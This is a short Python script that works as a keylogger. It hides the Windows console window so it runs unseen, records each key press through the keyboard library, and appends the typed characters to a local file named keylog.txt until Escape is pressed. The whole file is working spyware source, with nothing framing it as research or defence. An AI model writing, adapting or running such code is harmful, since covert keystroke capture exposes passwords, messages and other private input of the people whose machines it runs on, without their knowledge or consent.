import keyboard
import os
import ctypes
import sys


log_file = "keylog.txt"


if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def on_press(key):
    try:
        
        key_name = key.name if hasattr(key, 'name') else str(key)
        key_str = key_name.replace("'", "")
        
        
        if key_str == "space":
            key_str = " "
        elif key_str == "enter":
            key_str = "\n"
        elif len(key_str) > 1:   
            return
        
        
        with open(log_file, 'a') as f:
            f.write(key_str)
            
    except Exception as e:
        with open(log_file, 'a') as f:
            f.write(f"Error: {str(e)}")

def start_keylogger():
    
    if not os.path.exists(log_file):
        with open(log_file, 'w') as f:
            f.write("Keylogger started: ")
    
    
    keyboard.on_press(on_press)
    
    
    keyboard.wait('esc')

if __name__ == "__main__":
    start_keylogger()